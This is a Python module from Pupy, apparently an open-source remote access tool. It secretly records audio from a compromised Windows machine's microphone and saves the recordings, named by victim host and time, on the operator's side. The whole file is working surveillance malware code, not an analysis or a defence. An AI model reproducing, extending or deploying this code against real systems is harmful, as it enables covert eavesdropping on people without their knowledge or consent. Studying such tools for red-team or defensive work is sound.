# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib import *
import wave, datetime, os.path, subprocess

__class_name__="RecordMicrophoneModule"

def save_wav(path, sample_width, channels, rate, raw_frames):
    waveFile = wave.open(path, 'wb')
    waveFile.setnchannels(channels)
    waveFile.setsampwidth(sample_width)
    waveFile.setframerate(rate)
    waveFile.writeframes(raw_frames)
    waveFile.close()

@config(cat="gather", compat=["windows"])
class RecordMicrophoneModule(PupyModule):
    """ record sound with the microphone ! """
    dependencies=["pyaudio", "mic_recorder"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='record_mic', description=self.__doc__)
        self.arg_parser.add_argument('-t', '--time', default=5, help='number of 5 seconds recordings to save')
        self.arg_parser.add_argument('-m', '--max-length', default=None, help='split recorded files into multiple files if the recording goes over --max-length seconds')
        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default sound player for preview')

    def run(self, args):
        try:
            os.makedirs(os.path.join("data","audio_records"))
        except Exception:
            pass
        self.success("starting recording for %ss ..."%args.time)
        data=b""
        max_length=args.max_length
        if max_length is None:
            max_length=args.time
        if int(max_length) > int(args.time):
            raise PupyModuleError("--max-length argument cannot be bigger than --time")
        for sw, c, r, rf in self.client.conn.modules['mic_recorder'].record_iter(total=args.time, chunk=max_length):
            filepath=os.path.join("data","audio_records","mic_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".wav")
            save_wav(filepath, sw, c, r, rf)
            self.success("microphone recording saved to %s"%filepath)
        if args.view:
            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "sound_player"),filepath])


